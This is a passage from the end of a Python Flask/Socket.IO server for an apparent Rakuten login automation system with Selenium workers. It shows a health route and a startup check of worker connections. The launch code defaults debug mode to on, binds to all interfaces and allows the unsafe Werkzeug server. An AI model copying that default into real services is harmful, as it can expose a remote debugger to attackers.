    return jsonify({
        'success': True,
        'message': 'ブロックを削除しました'
    })

@app.get("/healthz")
def healthz():
    return "ok", 200

if __name__ == '__main__':
    print("=" * 70)
    print("楽天ログイン管理システム起動（サーバー側）")
    print("=" * 70)
    log_with_timestamp("INFO", "システム起動開始")
    
    # DNS事前解決 + ワーカー接続テスト関数
    def test_worker_connections():
        """登録されているワーカーへの接続テスト + DNS事前解決"""
        import socket
        
        log_with_timestamp("INFO", "===== ワーカー接続テスト開始 =====")
        
        if not selenium_workers:
            log_with_timestamp("WARN", "登録されているワーカーがありません")
            return
        
        for session_id, worker in selenium_workers.items():
            pc_url = worker.get('pc_url')
            if pc_url:
                # DNS事前解決（キャッシュに載せる）
                try:
                    from urllib.parse import urlparse
                    hostname = urlparse(pc_url).hostname
                    log_with_timestamp("INFO", f"DNS解決中... | Host: {hostname}")
                    ip_addresses = socket.getaddrinfo(hostname, 443, socket.AF_UNSPEC, socket.SOCK_STREAM)
                    log_with_timestamp("SUCCESS", f"✅ DNS解決成功 | Host: {hostname} | IPs: {len(ip_addresses)}個")
                except Exception as e:
                    log_with_timestamp("ERROR", f"❌ DNS解決失敗 | Host: {hostname} | Error: {str(e)}")
                    continue
                
                # 接続テスト
                try:
                    log_with_timestamp("INFO", f"接続テスト中... | URL: {pc_url}")
                    response = requests.get(f"{pc_url}/health", timeout=10)
                    if response.status_code == 200:
                        log_with_timestamp("SUCCESS", f"✅ ワーカー接続OK | URL: {pc_url}")
                    else:
                        log_with_timestamp("WARN", f"⚠️ ワーカー応答異常 | URL: {pc_url} | Status: {response.status_code}")
                except Exception as e:
                    log_with_timestamp("ERROR", f"❌ ワーカー接続失敗 | URL: {pc_url} | Error: {str(e)}")
        
        log_with_timestamp("INFO", "===== ワーカー接続テスト完了 =====")
    
    # 5秒後に接続テスト実行（起動直後は避ける）
    threading.Timer(5.0, test_worker_connections).start()
    
    # 環境変数で本番/開発モードを切り替え
    debug_mode = os.getenv('DEBUG', 'True').lower() == 'true'
    port = int(os.getenv('PORT', 5000))
    
    # eventlet/threading を環境変数で切替可
    socketio.run(
        app,
        debug=debug_mode,
        host='0.0.0.0',
        port=port,
        allow_unsafe_werkzeug=True,
        log_output=False
    )